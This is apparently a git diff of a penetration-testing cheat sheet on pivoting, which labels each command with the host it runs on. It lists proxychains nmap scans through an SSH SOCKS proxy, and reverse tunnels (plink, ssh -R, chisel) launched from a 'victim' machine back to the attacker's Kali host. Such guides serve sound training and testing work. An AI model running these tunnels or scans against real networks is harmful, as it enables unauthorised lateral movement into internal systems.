@@ -71,7 +71,7 @@ If the target has more than one NIC and more than one network subnet than we can
 In Kali edit the **proxychains** configuration file:
 
 ```text
-sudo vim /etc/proxychains.conf
+username@kali: sudo vim /etc/proxychains.conf
 ```
 
 Add this lines:
@@ -84,20 +84,20 @@ socks4 127.0.0.1 8080
 Perform a dynamic port forwarding to our port 8080
 
 ```text
-sudo ssh -N -D 127.0.0.1:8080 username@<target-IP>
+username@kali: sudo ssh -N -D 127.0.0.1:8080 username@<target-IP>
 ```
 
 Then scan with nmap and specify a **TCP** scan with `-sT` and don't use `ICMP` with `-Pn`. This flags are mandatory, read [this](https://security.stackexchange.com/questions/120708/nmap-through-proxy).
 
 ```text
-proxychains nmap -p- -sT -Pn <target-Second-Interface-IP>
+username@kali: proxychains nmap -p- -sT -Pn <target-Second-Interface-IP>
 ```
 
 Now we can use any application through **proxychains**… such as:
 
 ```text
-proxychains firefox
-proxychains nmap -sT -Pn -p139,445 $ip
+username@kali: proxychains firefox
+username@kali: proxychains nmap -sT -Pn -p139,445 $ip
 ```
 
 #### SOCKS4 Proxy
@@ -119,14 +119,14 @@ Cool Tip: Konami SSH Port forwarding
 #### Local Port Forwarding
 
 ```text
-ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
+username@kali: ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [victim-user]@[target-host]
 ```
 
 #### Remote Port Forwarding
 
 ```text
-ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
-ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
+username@victim: ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[kali]
+username@victim: ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
 ```
 
 ## SSHUTTLE
@@ -142,19 +142,19 @@ pip install sshuttlesshuttle -r user@host 10.10.10.10/24
 Remote port forwarding using plink. This is needed when we don’t have access to a specific port on the target machine. From the target machine we can execute this command:
 
 ```text
-plink.exe -ssh -l kali_user -pw kali_password -R $kali_ip:445:127.0.0.1:445 $kali_ip
+C:\Users\victim> plink.exe -ssh -l kali_user -pw kali_password -R $kali_ip:445:127.0.0.1:445 $kali_ip
 ```
 
 An alternative way to execute plink without prompt:
 
 ```text
-cmd.exe /c echo y | plink.exe -ssh -l kali_usernmae -pw kali_password -R <kali-IP>:<kali-port>:127.0.0.1:3306 <kali-IP>
+C:\Users\victim> cmd.exe /c echo y | plink.exe -ssh -l kali_usernmae -pw kali_password -R <kali-IP>:<kali-port>:127.0.0.1:3306 <kali-IP>
 ```
 
 After forwarding the port to our host, we can try scanning it or connecting to it:
 
 ```text
-sudo nmap -sS -sV 127.0.0.1 -p <kali-port>
+username@kali: sudo nmap -sS -sV 127.0.0.1 -p <kali-port>
 ```
 
 ## Chisel <a id="chisel"></a>
@@ -166,15 +166,15 @@ Chisel can be downloaded here: [https://github.com/jpillora/chisel](https://gith
 ### Windows Port Forwarding <a id="socks"></a>
 
 ```text
-./chisel server -p 8080 --reverse
-./chisel-x64.exe client 10.10.14.3:8080 R:socks
+username@kali: ./chisel server -p 8080 --reverse
+C:\Users\victim> ./chisel-x64.exe client 10.10.14.3:8080 R:socks
 ```
 
 ### Linux Port forwarding <a id="port-forwarding"></a>
 
 ```text
-./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
-./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
+username@kali: ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
+victim_username@victim: ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
 ```
 
 ## DNS Tunneling
